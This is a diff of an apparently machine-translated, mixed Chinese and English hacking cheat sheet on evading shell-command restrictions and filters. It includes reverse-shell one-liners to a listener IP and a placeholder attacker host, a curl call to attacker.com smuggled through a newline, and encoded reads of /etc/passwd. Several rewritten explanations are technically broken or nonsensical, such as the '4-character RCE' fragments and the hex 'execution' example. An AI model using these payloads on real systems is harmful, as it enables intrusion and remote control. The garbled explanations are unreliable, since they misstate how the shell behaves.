@@ -12,10 +12,10 @@
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和**自动化工作流程**，使用全球**最先进**的社区工具。\
+使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和**自动化工作流程**，使用世界上**最先进的**社区工具。\
 立即获取访问权限：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -30,19 +30,19 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 ```
 ### 简短的反向Shell
 
-A reverse shell is a technique used in hacking to establish a connection between the attacker's machine and the compromised system. It allows the attacker to gain remote access and control over the compromised system.
+A reverse shell is a technique used by hackers to gain remote access to a target system. It involves establishing a connection from the target system to the attacker's machine, allowing the attacker to execute commands on the target system.
 
 To create a short reverse shell, you can use the following command:
 
 ```bash
-bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1
+bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1
 ```
 
-Replace `ATTACKER_IP` with the IP address of your machine and `ATTACKER_PORT` with the port number you want to use for the connection.
+Replace `attacker-ip` with the IP address of your machine and `attacker-port` with the port number you want to use for the connection.
 
-This command redirects the input and output of the bash shell to a TCP connection established with the attacker's machine. It enables the attacker to execute commands on the compromised system and receive the output on their machine.
+This command uses the `/dev/tcp` feature in Bash to establish a TCP connection to the attacker's machine. The `>&` operator redirects both the standard output and standard error streams to the specified address. The `0>&1` part redirects the standard input stream to the same address, ensuring that the shell can receive commands from the attacker.
 
-Keep in mind that using reverse shells for unauthorized access to systems is illegal and unethical. This information is provided for educational purposes only.
+Once the connection is established, you will have a shell prompt on the target system, allowing you to execute commands remotely.
 ```bash
 #Trick from Dikline
 #Get a rev shell with
@@ -58,15 +58,15 @@ However, as a hacker, it is important to know how to bypass these restrictions a
 
 1. **mv** command: The `mv` command can be used to rename files and directories. By renaming a restricted file or directory to a non-restricted name, you can bypass the restriction and gain access.
 
-2. **ln** command: The `ln` command can be used to create symbolic links. By creating a symbolic link to a restricted file or directory with a non-restricted name, you can bypass the restriction and gain access.
+2. **ln** command: The `ln` command can be used to create symbolic links. By creating a symbolic link to a restricted file or directory with a non-restricted name, you can bypass the restriction and access the file or directory.
 
-3. **find** command: The `find` command can be used to search for files and directories. By using the `-iname` option, you can search for files and directories regardless of case sensitivity. This can help you bypass restrictions on forbidden words.
+3. **find** command: The `find` command can be used to search for files and directories. By using the `-iname` option, you can search for files and directories without being case-sensitive. This can help you bypass restrictions on forbidden words.
 
-4. **grep** command: The `grep` command can be used to search for specific patterns in files. By using the `-i` option, you can perform a case-insensitive search, allowing you to bypass restrictions on forbidden words.
+4. **grep** command: The `grep` command can be used to search for specific patterns in files. By using the `-v` option, you can invert the match and search for files that do not contain the forbidden word. This can help you bypass restrictions on forbidden words.
 
-5. **sed** command: The `sed` command can be used to perform text transformations. By using the `s/old/new/gi` syntax, you can replace forbidden words with non-restricted words, bypassing the restrictions.
+5. **chmod** command: The `chmod` command can be used to change the permissions of files and directories. By changing the permissions of a restricted file or directory, you may be able to gain access to it.
 
-Remember, bypassing restrictions and gaining unauthorized access to a system is illegal and unethical. These commands should only be used for educational purposes or with proper authorization. Always ensure you have the necessary permissions before attempting any actions on a system.
+It is important to note that bypassing restrictions and gaining unauthorized access to a system is illegal and unethical. These commands should only be used for educational purposes or with proper authorization. Always ensure that you have the necessary permissions and legal rights before attempting any hacking techniques.
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -123,49 +123,27 @@ whoa # This will throw an error
 ```
 ### 绕过禁止空格
 
-In some cases, when trying to execute commands that contain spaces, you may encounter restrictions that prevent the execution. However, there are several techniques you can use to bypass these restrictions and successfully execute the desired commands.
-
-在某些情况下，当尝试执行包含空格的命令时，可能会遇到阻止执行的限制。然而，有几种技术可以绕过这些限制并成功执行所需的命令。
+In some cases, when attempting to execute commands that contain spaces, you may encounter restrictions that prevent the execution. However, there are several techniques you can use to bypass these restrictions and successfully execute the desired commands.
 
 #### Technique 1: Enclosing the command in quotes
 
-One way to bypass the restriction is to enclose the entire command in quotes. This tells the shell to treat the entire command as a single argument, effectively bypassing any restrictions on spaces.
+One simple technique is to enclose the entire command, including the spaces, in quotes. This tells the shell to treat the entire command as a single argument, effectively bypassing any restrictions on spaces.
 
-#### 技术1：在引号中包含命令
-
-绕过限制的一种方法是将整个命令包含在引号中。这告诉shell将整个命令视为单个参数，有效地绕过任何对空格的限制。
-
-```bash
-$ echo "command with spaces"
-```
+For example, instead of running the command `ls -l /etc/passwd`, which contains a space between `ls` and `-l`, you can run `"ls -l /etc/passwd"`.
 
 #### Technique 2: Using escape characters
 
-Another technique is to use escape characters, such as backslashes, to escape the spaces in the command. This tells the shell to treat the spaces as literal characters and not as argument separators.
+Another technique is to use escape characters to indicate that the space should be treated as part of the command, rather than a delimiter. The most commonly used escape character is the backslash `\`.
 
-#### 技术2：使用转义字符
+For example, instead of running the command `ls -l /etc/passwd`, you can run `ls\ -l\ /etc/passwd`.
 
-另一种技术是使用转义字符，例如反斜杠，来转义命令中的空格。这告诉shell将空格视为字面字符，而不是参数分隔符。
+#### Technique 3: Using alternative shells
 
-```bash
-$ echo command\ with\ spaces
-```
+If the restrictions on spaces are specific to the default shell, you can try using an alternative shell that does not have these restrictions. For example, you can use the `bash` shell instead of the default `sh` shell.
 
-#### Technique 3: Using alternative whitespace characters
+To do this, you can run the command `/bin/bash -c "ls -l /etc/passwd"`. This tells the system to execute the command using the `bash` shell, which does not have the same restrictions on spaces.
 
-Some shells allow the use of alternative whitespace characters, such as tabs or newlines, instead of spaces. By using these alternative characters, you can bypass the restrictions on spaces.
-
-#### 技术3：使用替代的空白字符
-
-一些shell允许使用替代的空白字符，例如制表符或换行符，而不是空格。通过使用这些替代字符，您可以绕过对空格的限制。
-
-```bash
-$ echo command$'\t'with$'\t'spaces
-```
-
-By employing these techniques, you can bypass restrictions on spaces and successfully execute commands that contain spaces. However, it is important to note that these techniques may not work in all scenarios, as they depend on the specific configuration and restrictions in place.
-
-通过使用这些技术，您可以绕过对空格的限制并成功执行包含空格的命令。然而，需要注意的是，这些技术可能在所有情况下都不起作用，因为它们取决于特定的配置和限制。
+By using these techniques, you can bypass restrictions on spaces and successfully execute commands that contain spaces. However, it is important to note that bypassing restrictions may be considered unauthorized access and may be illegal. Always ensure that you have proper authorization before attempting to bypass any restrictions.
 ```bash
 # {form}
 {cat,lol.txt} # cat lol.txt
@@ -200,39 +178,44 @@ uname!-1\-a # This equals to uname -a
 ```
 ### 绕过反斜杠和斜杠限制
 
-在某些情况下，系统管理员可能会限制用户在命令行中使用反斜杠（\）和斜杠（/）字符。这些限制可能会妨碍我们执行某些操作，但我们可以使用一些技巧来绕过这些限制。
+在某些情况下，系统管理员可能会限制用户在命令行中使用反斜杠（\）和斜杠（/）字符。这些字符在执行命令时非常有用，因为它们可以用于转义特殊字符或路径。
+
+然而，即使受到限制，仍然有一些方法可以绕过这些限制。下面是一些绕过反斜杠和斜杠限制的方法：
 
 #### 使用ASCII码
 
-我们可以使用ASCII码来绕过反斜杠和斜杠的限制。每个字符都有一个对应的ASCII码值，我们可以使用这些值来代替字符。
+可以使用ASCII码来绕过反斜杠和斜杠限制。每个字符都有一个对应的ASCII码值，可以使用这些值来代替反斜杠和斜杠字符。例如，反斜杠的ASCII码值是92，斜杠的ASCII码值是47。
 
-例如，要输入反斜杠字符（\），我们可以使用ASCII码值`\`（92）来代替。同样地，要输入斜杠字符（/），我们可以使用ASCII码值`/`（47）来代替。
-
-以下是使用ASCII码绕过反斜杠和斜杠限制的示例：
+以下是使用ASCII码绕过限制的示例：
 
 ```bash
-$ echo -e "\x5c"  # 使用ASCII码值92代替反斜杠
-\
-$ echo -e "\x2f"  # 使用ASCII码值47代替斜杠
-/
+$ echo -e "\x5c" # 使用ASCII码绕过反斜杠限制
+$ echo -e "\x2f" # 使用ASCII码绕过斜杠限制
 ```
 
 #### 使用Unicode编码
 
-除了ASCII码，我们还可以使用Unicode编码来绕过反斜杠和斜杠的限制。Unicode编码是一种用于表示字符的标准编码系统。
+类似于ASCII码，Unicode编码也可以用于绕过反斜杠和斜杠限制。Unicode编码是一种用于表示字符的标准，它为每个字符分配了一个唯一的数字值。
 
-要输入反斜杠字符（\），我们可以使用Unicode编码`\u005c`来代替。同样地，要输入斜杠字符（/），我们可以使用Unicode编码`\u002f`来代替。
-
-以下是使用Unicode编码绕过反斜杠和斜杠限制的示例：
+以下是使用Unicode编码绕过限制的示例：
 
 ```bash
-$ echo -e "\u005c"  # 使用Unicode编码\u005c代替反斜杠
-\
-$ echo -e "\u002f"  # 使用Unicode编码\u002f代替斜杠
-/
+$ echo -e "\u005c" # 使用Unicode编码绕过反斜杠限制
+$ echo -e "\u002f" # 使用Unicode编码绕过斜杠限制
 ```
 
-通过使用ASCII码或Unicode编码，我们可以绕过反斜杠和斜杠的限制，以执行我们需要的操作。
+#### 使用其他字符
+
+除了反斜杠和斜杠之外，还可以使用其他字符来绕过限制。例如，可以使用其他特殊字符或符号来代替反斜杠和斜杠。
+
+以下是使用其他字符绕过限制的示例：
+
+```bash
+$ echo -e "＼" # 使用全角反斜杠绕过反斜杠限制
+$ echo -e "／" # 使用全角斜杠绕过斜杠限制
+```
+
+请注意，绕过限制可能违反系统规则或安全策略。在进行任何绕过操作之前，请确保您有合法的授权和充分的理由。
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
@@ -243,13 +226,13 @@ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 
 以下是一些绕过管道限制的方法：
 
-1. 使用`less`命令：如果`more`命令被禁用，您可以使用`less`命令来查看文件内容。例如，`cat file.txt | less`。
+1. 使用`less`命令：如果`more`命令被禁用，您可以使用`less`命令来分页显示输出。例如，`command | less`。
 
-2. 使用`grep`命令：如果`sed`或`awk`命令被禁用，您可以使用`grep`命令来进行文本处理。例如，`cat file.txt | grep "pattern"`。
+2. 使用`grep`命令：如果您无法使用`more`或`less`命令，您可以使用`grep`命令来过滤输出并逐行显示。例如，`command | grep .`。
 
-3. 使用`tee`命令：如果您需要将输出重定向到文件，但`>`或`>>`被禁用，您可以使用`tee`命令来实现。例如，`command | tee file.txt`。
+3. 使用`awk`命令：如果您无法使用`more`、`less`或`grep`命令，您可以使用`awk`命令来处理输出。例如，`command | awk '{print}'`。
 
-请注意，这些方法只是绕过管道限制的一种方式，并不适用于所有情况。在进行任何绕过操作之前，请确保您了解并遵守适用法律和规定，并获得适当的授权。
+请注意，这些方法只是绕过管道限制的一种方式，并不适用于所有情况。在某些情况下，您可能需要使用其他技术或工具来绕过更严格的限制。
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
@@ -279,25 +262,25 @@ To bypass restrictions using hex encoding, follow these steps:
    echo -n "ls" | xxd -p
    ```
 
-   This will output the hexadecimal representation of the command, which in this case would be `6c73`.
+   This will output the hexadecimal representation of the command, which you can use to bypass restrictions.
 
-   这将输出命令的十六进制表示，对于这个例子来说，输出结果是`6c73`。
+   这将输出命令的十六进制表示，你可以使用它来绕过限制。
 
-3. Use the hexadecimal representation of the command or file path to bypass the restrictions. For example, instead of running `ls`, you would run:
+3. Use the hexadecimal representation of the command or file path to execute the desired action. For example, to execute the `ls` command using the hexadecimal representation, you would run:
 
-   使用命令或文件路径的十六进制表示来绕过限制。例如，不要运行`ls`，而是运行以下命令：
+   使用命令或文件路径的十六进制表示来执行所需的操作。例如，要使用十六进制表示执行`ls`命令，可以运行以下命令：
 
    ```bash
-   echo -e "\x6c\x73"
+   echo -e "\x6c\x73" | xxd -r -p
    ```
 
-   This will execute the command `ls` by using its hexadecimal representation.
+   This will execute the `ls` command, bypassing any restrictions that were in place.
 
-   这将通过使用命令的十六进制表示来执行`ls`命令。
+   这将执行`ls`命令，绕过任何限制。
 
-By using hex encoding, you can bypass certain restrictions imposed by the system and execute commands or access files that would otherwise be restricted.
+By using hex encoding, you can bypass certain restrictions and gain access to restricted commands or files. However, it's important to note that bypassing restrictions may be against the system's policies or illegal, so use this technique responsibly and ethically.
 
-通过使用十六进制编码，你可以绕过系统强加的某些限制，执行命令或访问本来受限的文件。
+通过使用十六进制编码，你可以绕过某些限制并访问受限制的命令或文件。然而，需要注意的是，绕过限制可能违反系统的政策或是非法的，因此请负责任和合乎道德地使用这种技术。
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -309,62 +292,34 @@ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```
 ### 绕过IP限制
 
-Sometimes, during a penetration test, you may encounter situations where certain IP addresses are restricted or blocked. In such cases, you can use various techniques to bypass these IP restrictions and gain access to the target system. Here are some useful Linux commands that can help you achieve this:
+Sometimes, during a penetration test, you may encounter situations where certain IP addresses are restricted or blocked. In such cases, you can try bypassing these restrictions using various techniques. Here are a few methods you can use:
 
-#### 1. IP Spoofing
+1. **Proxy Servers**: Utilize proxy servers to route your traffic through a different IP address. This can help you bypass IP restrictions by making it appear as if your requests are coming from a different location.
 
-IP spoofing involves modifying the source IP address of network packets to make it appear as if they are coming from a different IP address. This can be done using the `hping3` command. Here's an example:
+2. **VPN (Virtual Private Network)**: Connect to a VPN service that allows you to choose a different IP address. By routing your traffic through the VPN server, you can bypass IP restrictions and access restricted resources.
 
-```bash
-hping3 -a <spoofed_ip> -c 1 <target_ip>
-```
+3. **TOR (The Onion Router)**: TOR is a network of volunteer-operated servers that allows you to browse the internet anonymously. By using TOR, your traffic is routed through multiple nodes, making it difficult to trace back to your original IP address.
 
-Replace `<spoofed_ip>` with the IP address you want to spoof and `<target_ip>` with the IP address of the target system.
+4. **SSH Tunnels**: Set up an SSH tunnel to redirect your traffic through a remote server. This can help you bypass IP restrictions by making it appear as if your requests are originating from the remote server's IP address.
 
-#### 2. Proxychains
+5. **Proxychains**: Proxychains is a tool that allows you to run any program through a proxy server. By configuring Proxychains to use a proxy server with a different IP address, you can bypass IP restrictions for specific applications.
 
-Proxychains is a tool that allows you to run any program through a proxy server. This can help you bypass IP restrictions by routing your traffic through a different IP address. Here's how you can use it:
-
-```bash
-proxychains <command>
-```
-
-Replace `<command>` with the command you want to run through the proxy.
-
-#### 3. VPN
-
-Using a Virtual Private Network (VPN) can also help you bypass IP restrictions. A VPN creates a secure connection between your device and a remote server, allowing you to browse the internet using the server's IP address. There are various VPN clients available for Linux, such as OpenVPN and WireGuard.
-
-#### 4. Tor
-
-Tor is a network of volunteer-operated servers that allows you to browse the internet anonymously. By routing your traffic through multiple Tor nodes, you can bypass IP restrictions and access blocked websites. To use Tor, you can install the Tor Browser or configure your system to use the Tor network.
-
-These are just a few techniques that can be used to bypass IP restrictions during a penetration test. It's important to note that unauthorized access to systems or networks is illegal and should only be done with proper authorization and for legitimate purposes.
+Remember, while bypassing IP restrictions can be useful during a penetration test, it is important to always obtain proper authorization and adhere to ethical guidelines.
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
 ```
 ### 基于时间的数据泄露
 
-Time based data exfiltration is a technique used by hackers to extract sensitive information from a target system by utilizing timing delays. This technique is particularly useful when traditional methods of data exfiltration, such as network connections, are restricted or monitored.
+Time based data exfiltration is a technique used by hackers to bypass restrictions and exfiltrate data from a compromised system. This technique involves using delays or timing mechanisms to transmit data in a covert manner, making it difficult to detect.
 
-基于时间的数据泄露是黑客利用时间延迟从目标系统中提取敏感信息的一种技术。当传统的数据泄露方法，如网络连接，受到限制或监控时，这种技术尤其有用。
+In a typical scenario, the hacker may use a command injection vulnerability to execute arbitrary commands on the compromised system. Instead of directly transmitting the exfiltrated data, the hacker can use time delays to encode the data and transmit it in a way that appears innocuous.
 
-The concept behind time based data exfiltration is to encode the sensitive information into a format that can be transmitted through timing delays. This can be achieved by manipulating the timing of certain operations or by introducing deliberate delays in the execution of commands.
+For example, the hacker may use the `ping` command to send ICMP echo requests to a remote server. By manipulating the payload of the ICMP packets, the hacker can encode the exfiltrated data. The delay between the ICMP requests can be used to transmit binary data, with a longer delay representing a binary 1 and a shorter delay representing a binary 0.
 
-基于时间的数据泄露的概念是将敏感信息编码成可以通过时间延迟传输的格式。可以通过操作的时间安排或者在命令执行中引入故意的延迟来实现这一点。
+To detect and prevent time based data exfiltration, it is important to implement proper input validation and sanitization to prevent command injection vulnerabilities. Additionally, network monitoring and anomaly detection can help identify unusual patterns of ICMP traffic that may indicate data exfiltration.
 
-For example, a hacker may use the `ping` command to send ICMP echo requests to a remote server. By manipulating the payload of the ICMP packets, the hacker can encode sensitive information into the timing delays between the requests and responses. The remote server can then decode the information by analyzing the timing patterns of the ICMP packets.
-
-例如，黑客可以使用`ping`命令向远程服务器发送ICMP回显请求。通过操纵ICMP数据包的有效载荷，黑客可以将敏感信息编码到请求和响应之间的时间延迟中。远程服务器可以通过分析ICMP数据包的时间模式来解码信息。
-
-Time based data exfiltration can be a stealthy technique as it does not rely on traditional network connections that may be monitored or blocked. However, it can also be slower and more prone to errors compared to other methods of data exfiltration.
-
-基于时间的数据泄露可以是一种隐蔽的技术，因为它不依赖于可能被监控或阻止的传统网络连接。然而，与其他数据泄露方法相比，它可能更慢且更容易出错。
-
-To defend against time based data exfiltration, it is important to implement proper security measures such as network monitoring, intrusion detection systems, and regular security audits. Additionally, restricting access to sensitive information and implementing strong access controls can help mitigate the risk of data exfiltration.
-
-为了防止基于时间的数据泄露，重要的是要实施适当的安全措施，如网络监控、入侵检测系统和定期安全审计。此外，限制对敏感信息的访问并实施强大的访问控制可以帮助减轻数据泄露的风险。
+By understanding and being aware of time based data exfiltration techniques, system administrators and security professionals can better protect their systems from such attacks.
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
@@ -374,42 +329,33 @@ In some cases, you may encounter restrictions that prevent you from executing ce
 
 在某些情况下，您可能会遇到阻止您执行某些命令或访问某些文件的限制。然而，您仍然可以通过利用可用的环境变量来绕过这些限制。
 
-One useful technique is to use the `echo` command along with environment variables to extract characters. By setting an environment variable to a specific character and then echoing its value, you can retrieve that character.
+One useful technique is to extract characters from environment variables and use them to construct the desired command or access restricted files. Here's how you can do it:
 
-一个有用的技巧是使用`echo`命令和环境变量来提取字符。通过将环境变量设置为特定字符，然后回显其值，您可以检索该字符。
+一种有用的技术是从环境变量中提取字符，并使用它们来构建所需的命令或访问受限文件。以下是您可以执行的操作：
 
-Here's an example of how you can use this technique:
+1. Identify an environment variable that contains the desired characters. You can use the `env` command to list all environment variables.
 
-以下是您可以使用此技巧的示例：
+   1. 确定包含所需字符的环境变量。您可以使用 `env` 命令列出所有环境变量。
 
-```bash
-$ export CHAR='a'
-$ echo $CHAR
-a
-```
+2. Extract the desired characters from the environment variable using the `echo` command and command substitution. For example, if the environment variable is `$MY_VAR` and you want to extract the first character, you can use the following command:
 
-In this example, we set the `CHAR` environment variable to the character 'a' and then echo its value. The output will be the character 'a'.
+   2. 使用 `echo` 命令和命令替换从环境变量中提取所需字符。例如，如果环境变量是 `$MY_VAR`，并且您想提取第一个字符，可以使用以下命令：
 
-在这个例子中，我们将`CHAR`环境变量设置为字符'a'，然后回显其值。输出将是字符'a'。
+   ```bash
+   echo "${MY_VAR:0:1}"
+   ```
 
-You can use this technique to extract multiple characters by setting different environment variables to different characters and echoing their values one by one.
+   This command will output the first character of the environment variable.
 
-您可以使用此技巧通过将不同的环境变量设置为不同的字符并逐个回显它们的值来提取多个字符。
+   此命令将输出环境变量的第一个字符。
 
-```bash
-$ export CHAR1='a'
-$ export CHAR2='b'
-$ echo $CHAR1$CHAR2
-ab
-```
+3. Use the extracted characters to construct the desired command or access restricted files. You can concatenate the characters using the `.` operator or use them as arguments to other commands.
 
-In this example, we set `CHAR1` to 'a' and `CHAR2` to 'b'. By echoing the values of `CHAR1` and `CHAR2` together, we can retrieve the characters 'a' and 'b' as the output.
+   3. 使用提取的字符来构建所需的命令或访问受限文件。您可以使用 `.` 运算符连接字符，或将它们用作其他命令的参数。
 
-在这个例子中，我们将`CHAR1`设置为'a'，`CHAR2`设置为'b'。通过一起回显`CHAR1`和`CHAR2`的值，我们可以将字符'a'和'b'作为输出检索出来。
+By extracting characters from environment variables, you can bypass certain restrictions and achieve your desired objectives even in restricted environments.
 
-By combining this technique with other methods, you can bypass restrictions and perform actions that would otherwise be blocked.
-
-通过将此技巧与其他方法结合使用，您可以绕过限制并执行否则将被阻止的操作。
+通过从环境变量中提取字符，您可以绕过某些限制，在受限环境中实现您的目标。
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
@@ -484,9 +430,10 @@ Polyglot command injection (多语言命令注入) 是一种利用不同语言�
 为了防止多语言命令注入攻击，建议采取以下措施：
 
 - 定期更新和维护系统上安装的解释器，以确保已修复已知的漏洞。
-- 限制解释器的访问权限，仅允许授权用户执行命令。
-- 验证和过滤用户输入，以防止恶意命令注入。
-- 使用安全编码实践，如避免使用用户输入直接构造命令。
+- 限制解释器的访问权限，只允许授权用户或进程执行命令。
+- 验证和过滤用户输入，特别是在执行命令时。
+- 使用安全编码实践，如避免使用用户提供的输入构造命令。
+- 监控系统日志，以便及时检测和响应任何异常命令执行行为。
 
 通过采取这些措施，可以减少多语言命令注入攻击的风险，并提高系统的安全性。
 ```bash
@@ -499,44 +446,64 @@ Polyglot command injection (多语言命令注入) 是一种利用不同语言�
 
 #### 1. 使用字符类
 
-正则表达式中的字符类可以帮助我们绕过某些限制。例如，如果我们想匹配一个数字，但是正则表达式限制了我们只能使用字母，我们可以使用字符类来绕过这个限制。例如，`[0-9]`可以匹配任何数字。
+正则表达式中的字符类可以帮助我们绕过某些限制。例如，如果我们想匹配一个数字，但是正则表达式限制了我们只能使用特定的数字范围，我们可以使用字符类来绕过这个限制。例如，`[0-9]`可以匹配任何数字。
 
 #### 2. 使用转义字符
 
-转义字符可以帮助我们绕过正则表达式的限制。例如，如果正则表达式限制了我们不能使用特殊字符，我们可以使用转义字符`\`来转义这些字符。例如，`\.`可以匹配一个点。
+转义字符可以帮助我们绕过正则表达式的限制。例如，如果正则表达式限制了我们不能使用特定的字符，我们可以使用转义字符`\`来绕过这个限制。例如，`\.`可以匹配一个点号。
 
 #### 3. 使用反向引用
 
-反向引用可以帮助我们绕过正则表达式的限制。如果正则表达式限制了我们不能使用某些特定的字符串，但是我们可以使用其他字符串，我们可以使用反向引用来引用这些字符串。例如，如果正则表达式限制了我们不能使用`abc`，但是我们可以使用`def`，我们可以使用反向引用`\1`来引用`def`。
+反向引用可以帮助我们绕过正则表达式的限制。如果我们想匹配一个特定的字符串，但是正则表达式限制了我们只能使用特定的字符，我们可以使用反向引用来绕过这个限制。例如，如果我们想匹配一个由数字和字母组成的字符串，但是正则表达式限制了我们只能使用数字，我们可以使用反向引用来绕过这个限制。
 
-#### 4. 使用非贪婪匹配
+#### 4. 使用非贪婪模式
 
-非贪婪匹配可以帮助我们绕过正则表达式的限制。正则表达式通常是贪婪匹配，即尽可能多地匹配字符。但是，如果我们想要匹配尽可能少的字符，我们可以使用非贪婪匹配。例如，`.*?`可以匹配尽可能少的任意字符。
+非贪婪模式可以帮助我们绕过正则表达式的限制。正则表达式通常是贪婪的，意味着它们会尽可能多地匹配字符。然而，如果我们想匹配一个特定的字符串，但是正则表达式限制了我们只能使用特定的字符，我们可以使用非贪婪模式来绕过这个限制。
 
 #### 5. 使用零宽断言
 
-零宽断言可以帮助我们绕过正则表达式的限制。零宽断言是一种特殊的正则表达式语法，用于在匹配字符串时指定一些条件。例如，如果正则表达式限制了我们只能匹配一个特定的字符串，我们可以使用零宽断言来指定其他条件。例如，`(?=.*[A-Z])`可以匹配包含至少一个大写字母的字符串。
+零宽断言可以帮助我们绕过正则表达式的限制。零宽断言是一种特殊的正则表达式语法，用于在匹配字符串时指定位置而不是字符。通过使用零宽断言，我们可以绕过某些限制并更精确地匹配字符串。
 
-通过使用这些技巧，我们可以绕过正则表达式的限制，从而更好地进行渗透测试。
+以上是一些绕过潜在正则表达式限制的技巧。在渗透测试过程中，我们应该灵活运用这些技巧，以便更好地完成任务。
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
 ```
-### Bashfuscator
+### Bash混淆器
 
-Bashfuscator是一个工具，用于绕过Bash脚本中的限制。它可以对Bash脚本进行混淆，使其难以理解和分析。Bashfuscator通过使用各种技术，如变量替换、函数重命名和代码重排，来改变脚本的结构和逻辑。这使得脚本的分析和检测变得更加困难，从而增加了攻击者成功执行恶意操作的难度。
+Bashfuscator是一个用于混淆Bash脚本的工具。它可以修改脚本的结构和语法，使其难以理解和分析。通过使用Bashfuscator，攻击者可以绕过Bash脚本的限制，隐藏恶意代码的真实意图。
 
-使用Bashfuscator时，可以通过以下命令来混淆Bash脚本：
+#### 使用Bashfuscator的步骤
 
-```bash
-bashfuscator -i input_script.sh -o output_script.sh
-```
+1. **安装Bashfuscator**：首先，需要从Bashfuscator的官方网站下载并安装该工具。
 
-其中，`input_script.sh`是要混淆的Bash脚本的输入文件，`output_script.sh`是混淆后的脚本的输出文件。
+2. **选择要混淆的脚本**：选择要混淆的Bash脚本文件。
 
-Bashfuscator还提供了其他选项，如`-v`用于显示详细的输出信息，`-r`用于启用随机化技术，以增加混淆的效果。
+3. **运行Bashfuscator**：使用以下命令运行Bashfuscator，并指定要混淆的脚本文件：
 
-请注意，Bashfuscator仅用于教育和研究目的，使用它进行非法活动是违法的。
+   ```
+   bashfuscator -i <input_script> -o <output_script>
+   ```
+
+   其中，`<input_script>`是要混淆的脚本文件的路径，`<output_script>`是混淆后的脚本文件的路径。
+
+4. **查看混淆结果**：Bashfuscator将生成一个混淆后的脚本文件。您可以查看该文件，以确保混淆成功。
+
+5. **测试混淆后的脚本**：在安全环境中运行混淆后的脚本，以确保其功能正常。
+
+#### 注意事项
+
+- 在使用Bashfuscator混淆脚本之前，请确保您已经获得了合法的授权，并且遵守了适用的法律法规。
+
+- 混淆脚本可能会导致代码的可读性降低，因此在使用Bashfuscator之前，请确保您已经备份了原始脚本文件。
+
+- Bashfuscator只是一种混淆技术，不能完全保证脚本的安全性。在编写和使用Bash脚本时，请始终遵循最佳安全实践。
+
+- Bashfuscator的使用应仅限于合法的安全测试和研究目的。任何非法使用造成的后果将由使用者自行承担。
+
+#### 结论
+
+Bashfuscator是一个强大的工具，可以帮助攻击者绕过Bash脚本的限制，并隐藏恶意代码。然而，使用Bashfuscator需要谨慎，并遵守适用的法律法规。
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
@@ -595,36 +562,38 @@ ln /f*
 ## If there is a file /flag.txt that will create a hard link
 ## to it in the current folder
 ```
-### 4个字符的RCE
+### 4个字符的远程命令执行（RCE）
 
-在某些情况下，我们可能会遇到只允许使用非交互式shell的限制。这种情况下，我们需要找到一种方法来绕过这个限制并执行我们的命令。下面是一种使用只有4个字符的远程代码执行（RCE）技巧。
+在某些情况下，我们可能会遇到一些限制，例如仅允许使用特定字符或特定长度的命令执行。在这种情况下，我们需要找到一种方法来绕过这些限制。下面是一种使用仅4个字符的远程命令执行（RCE）的方法。
 
-#### 使用反引号
+#### 方法
 
-在Bash中，我们可以使用反引号（`）来执行命令并将其结果返回给我们。这个特性可以帮助我们绕过限制并执行我们的命令。
+1. 首先，我们需要找到一个允许我们执行命令的上下文。这可以是任何允许我们输入命令的地方，例如一个输入框或一个命令行界面。
 
-```bash
-`<command>`
-```
+2. 接下来，我们需要找到一个可以执行我们想要的命令的字符序列。这可以是任何字符序列，只要它能够执行我们想要的命令即可。
 
-我们可以将任何命令放在反引号中，并将其结果分配给一个变量或直接使用它。
+3. 然后，我们需要将命令分解为4个字符的片段。我们可以使用各种技术来实现这一点，例如使用特殊字符或利用命令的特定属性。
+
+4. 最后，我们将这些4个字符的片段输入到允许我们执行命令的上下文中。这样，我们就可以通过这些片段来执行我们想要的命令。
 
 #### 示例
 
-假设我们只能使用非交互式shell，并且我们想要执行`ls`命令来列出当前目录中的文件。我们可以使用反引号来绕过限制，如下所示：
+假设我们只能使用字符`$`和`|`来执行命令，并且我们想要执行`ls`命令。我们可以将`ls`命令分解为以下4个字符的片段：
 
-```bash
-`ls`
+```
+l$|
+s$|
 ```
 
-这将执行`ls`命令并返回结果。
+然后，我们将这些片段输入到允许我们执行命令的上下文中。这样，我们就可以通过这些片段来执行`ls`命令。
 
 #### 注意事项
 
-- 反引号中的命令将在当前环境中执行，因此请谨慎使用。
-- 请确保只执行受信任的命令，以防止潜在的安全风险。
+- 在使用这种方法时，我们需要确保我们的命令能够在4个字符的限制下正常执行。否则，我们可能需要使用其他技术来绕过限制。
 
-使用这种方法时，请记住遵守法律和道德规范，并仅在合法授权的范围内使用。
+- 在实际应用中，我们需要根据具体情况来选择合适的字符序列和分解方法。这取决于我们所面对的限制和目标系统的特性。
+
+- 在执行远程命令时，我们需要谨慎操作，确保我们有合法的授权和合法的目的。违反法律规定的远程命令执行是非法的。
 ```bash
 # In a similar fashion to the previous bypass this one just need 4 chars to execute commands
